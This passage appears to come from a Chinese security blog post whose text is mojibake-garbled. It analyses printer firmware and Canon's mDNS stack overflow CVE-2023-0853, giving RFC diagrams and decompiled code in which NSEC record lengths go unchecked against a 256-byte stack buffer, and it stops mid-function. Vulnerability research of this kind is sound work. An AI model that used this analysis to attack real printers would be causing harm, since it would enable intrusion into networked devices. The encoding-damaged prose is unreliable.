&lt;p&gt;Âú®ÂàÜÊûêÈÅéÂæåÔºåÊàëÂÄëÂæû Firmware ‰∏≠ÊâæÂà∞ fwupd ‰∏≠ÊúâËß£ÂØÜÁõ∏ÈóúË≥áË®äÔºåÈÄèÈÅéÈÄÜÂêëÂèØ‰ª•Áü•ÈÅìÂä†ÂØÜÊñπÊ≥ïÂèä KeyÔºåÈÄ≤ËÄåËß£Âá∫ÁõÆÊ®ôÁâàÊú¨ÁöÑ Firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;mDNS ÂçîÂÆö‰∏ªË¶ÅÊèê‰æõ‰∫ÜÂçÄÁ∂≤‰∏≠ÁöÑÂüüÂêçËß£ÊûêÂäüËÉΩÔºå‰∏¶‰∏î‰∏çÈúÄË¶ÅÊúâ Name Server ÁöÑ‰ªãÂÖ•ÔºåÂ∏∏Áî®Êñº Apple Âèä IoT Ë®≠ÂÇô‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂú® Canon ‰∏≠ÔºåÈ†êË®≠ÊÉÖÊ≥Å‰∏ãÔºå‰πüÊèê‰æõ‰∫ÜÁõ∏ÂêåÁöÑÂäüËÉΩÔºåÊñπ‰æø‰ΩøÁî®ËÄÖÂ∞ãÊâæÂçÄÁ∂≤‰∏≠ÁöÑÂç∞Ë°®Ê©ü„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë©≤ÂçîÂÆö‰∏ªË¶Å‰ª• DNS ÁÇ∫Âü∫Á§éÔºåÂü∫Êú¨‰∏ä mDNS ‰πüÂ§ßÂ§öÂª∫Á´ãÂú® DNS Â∞ÅÂåÖÊ†ºÂºè &lt;a href=&quot;https://www.ietf.org/rfc/rfc1035.txt&quot;&gt;(RFC1035)&lt;/a&gt; ‰∏äÔºåÊ†ºÂºèÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰∏ªË¶ÅÂèØ‰ª•ÊãÜÂàÜÁÇ∫ Header Âèä body ÈÉ®ÂàÜÔºå‰∏ªË¶ÅÁöÑË´ãÊ±ÇÈÉΩÊîæÂú® body ‰∏≠ÔºåÂæåÈù¢‰∏âÂÄãÊ¨Ñ‰ΩçÁÇ∫ÂêåÊ®£ÁöÑÊ†ºÂºè„ÄÇ Answer Ê¨Ñ‰Ωç‰∏ªË¶ÅÁ¥ÄÈåÑÈáùÂ∞ç Question ÁöÑ Resource records (RRs)Ôºå&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;RDATA ÈÉ®ÂàÜÊúÉÊ†πÊìö type ‰∏çÂêåËÄåÊúâÊâÄ‰∏çÂêåÔºåËÄåÁï∂ type=NSEC ÂÖ∂Ê†ºÂºèÂ¶Ç‰∏ã&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂È§òÈÉ®ÂàÜÂú®ÈÄôÂÄãÊºèÊ¥û‰∏≠‰∏çÂ§™ÈáçË¶ÅÔºå‰∏çÂè¶Â§ñÂ§öÂÅöË©≥Á¥∞Ëß£ÈáãÔºåÊõ¥Â§öÁ¥∞ÁØÄÂèØ‰ª•ÂèÉËÄÉ &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt; „ÄÅ &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt;
‰ª•Âèä &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÊºèÊ¥û‰ΩçÁΩÆ&lt;/strong&gt;
Áï∂ Canon ImageCLASS MF743Cdw Âú®ËôïÁêÜ Answer Ê¨Ñ‰Ωç(type=NSEC)ÊôÇÔºå‰∏¶Ê≤íÊúâÊ™¢Êü•Èï∑Â∫¶Â∞éËá¥ stack overflow „ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt; function ÊòØ‰∏ªË¶ÅË≤†Ë≤¨ËôïÁêÜÂ∞ÅÂåÖ‰∏≠ answer Ê¨Ñ‰Ωç&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
